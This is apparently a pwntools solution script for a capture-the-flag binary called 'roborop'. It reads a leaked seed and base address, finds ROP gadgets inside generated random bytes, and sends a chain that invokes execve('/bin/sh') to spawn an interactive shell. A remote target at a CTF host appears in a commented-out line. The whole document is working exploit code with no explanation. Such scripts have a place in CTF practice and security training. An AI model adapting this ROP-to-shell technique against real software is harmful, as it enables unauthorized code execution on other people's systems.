from pwn import *

exe = ELF("./roborop")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.35.so")

context.binary = exe

s_asm = """
    syscall
"""
syscall = asm(s_asm)

s1_asm = """
    push 0x3b
    ret
"""
push_execve = asm(s1_asm)

s2_asm = """
    pop rax
    ret
"""
pop_rax = asm(s2_asm)

s4_asm = """
    push rdi
    ret
"""
push_rdi = asm(s4_asm)

s5_asm = """
    push rsp
    ret
"""
push_rsp = asm(s5_asm)

s6_asm = """
    pop rdi
    ret
"""
pop_rdi = asm(s6_asm)

# p = remote("roborop-1.play.hfsc.tf", 1993)

p = process([exe.path])
gdb.attach(p)

p.recvuntil(b"seed: ")
seed = int(p.recvline().strip(),16)

p.recvuntil(b"addr: ")
base = int(p.recvline().strip(),16)

log.success(f"{hex(seed)=}")
log.success(f"{hex(base)=}")

r = process("./random_bytes")
r.sendline(hex(seed).encode())
shellhex = r.recvline().decode().strip()
shellbytes = bytes.fromhex(shellhex)
r.close()

# payload = p64(base + shellbytes.index(push_execve))
payload = p64(base + shellbytes.index(pop_rax))
payload += b"\x3b".ljust(8, b"\x00")
payload += p64(base + shellbytes.index(push_rsp))
payload += pop_rdi.ljust(8, b"\x00")
payload += b"/bin/sh\x00"
payload += p64(base + shellbytes.index(syscall))

p.recvuntil(b"rops: ")
p.sendline(payload)

p.interactive()
